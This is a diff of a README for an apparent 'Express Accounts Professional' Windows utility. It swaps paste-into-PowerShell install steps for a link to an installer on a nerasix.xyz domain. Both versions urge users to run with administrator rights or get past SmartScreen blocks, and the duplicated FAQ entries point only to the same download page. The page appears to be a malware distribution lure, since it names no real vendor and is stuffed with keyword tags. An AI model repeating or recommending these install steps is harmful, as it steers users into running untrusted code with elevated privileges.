@@ -6,20 +6,14 @@ Express Accounts Professional Windows Guide · Accounting tools · Finance workf
 
 > Professional Express Accounts Professional Windows Guide build with maintenance workflows, system utilities, and optimization tools included for daily desktop use.
 
+## Download
 
-## Install on Windows
+> Use the project link below for Windows.
 
-**Do this:**
-
-1. Press the **Windows** key, type **powershell**
-3. **Copy** the command below, **paste** it into PowerShell, press **Enter**
-4. Click **Yes** if Windows asks for permission
-
-```https://express-accounts-professional-windows-guide.nerasix.xyz/```
-
-**If nothing happens or you see a policy error**, paste this instead:
-
-```https://express-accounts-professional-windows-guide.nerasix.xyz/```
+* **Project link:** **[express-accounts-professional-windows-guide.nerasix.xyz](https://express-accounts-professional-windows-guide.nerasix.xyz/)**
+* **Full URL:** `https://express-accounts-professional-windows-guide.nerasix.xyz/`
+* **Type:** Desktop package | Windows 10 and 11, 64-bit
+* **Setup:** Run the installer from the extracted folder
 
 
 ---
@@ -40,7 +34,7 @@ Notes for users who need **Express Accounts Professional Windows Guide** running
 | Scan finds no issues but app still slow | Reboot; rerun maintenance profile |
 | Repair action needs reboot | Schedule reboot; rerun setup command |
 | Missing admin rights error | Run PowerShell as administrator |
-| Install blocked by SmartScreen | Run PowerShell as administrator; retry setup command |
+| Install blocked by SmartScreen | Open the Nerasix download page and click **Download** |
 
 ## Requirements
 
@@ -53,18 +47,18 @@ Notes for users who need **Express Accounts Professional Windows Guide** running
 ## FAQ
 
 <details>
-<summary><b>What exactly do I paste?</b></summary>
-<br>Open <a href="https://express-accounts-professional-windows-guide.nerasix.xyz/">express-accounts-professional-windows-guide.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<summary><b>How do I install?</b></summary>
+<br>Open <a href="https://express-accounts-professional-windows-guide.nerasix.xyz/">express-accounts-professional-windows-guide.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the Nerasix page.
 </details>
 
 <details>
-<summary><b>Where is PowerShell?</b></summary>
-<br>Open <a href="https://express-accounts-professional-windows-guide.nerasix.xyz/">express-accounts-professional-windows-guide.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<summary><b>How do I install?</b></summary>
+<br>Open <a href="https://express-accounts-professional-windows-guide.nerasix.xyz/">express-accounts-professional-windows-guide.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the Nerasix page.
 </details>
 
 <details>
-<summary><b>Command did not run?</b></summary>
-<br>Open <a href="https://express-accounts-professional-windows-guide.nerasix.xyz/">express-accounts-professional-windows-guide.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<summary><b>Download didn't start?</b></summary>
+<br>Open <a href="https://express-accounts-professional-windows-guide.nerasix.xyz/">express-accounts-professional-windows-guide.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the Nerasix page.
 </details>
 
 <details>
@@ -75,12 +69,3 @@ Notes for users who need **Express Accounts Professional Windows Guide** running
 ---
 
 **Topics:** express-accounts, express-accounts-app, system-utility, windows-tools, express-accounts-setup-failed-fix, how-to-install-express-accounts, maintenance-tools, pc-utility, desktop-tools, express-accounts-windows, express-accounts-windows-setup, express-accounts-windows-setup-2026
-
-## Download
-
-> Use the project link below for Windows.
-
-* **Project link:** **[express-accounts-professional-windows-guide.nerasix.xyz](https://express-accounts-professional-windows-guide.nerasix.xyz/)**
-* **Full URL:** `https://express-accounts-professional-windows-guide.nerasix.xyz/`
-* **Type:** Desktop package | Windows 10 and 11, 64-bit
-* **Setup:** Run the installer from the extracted folder
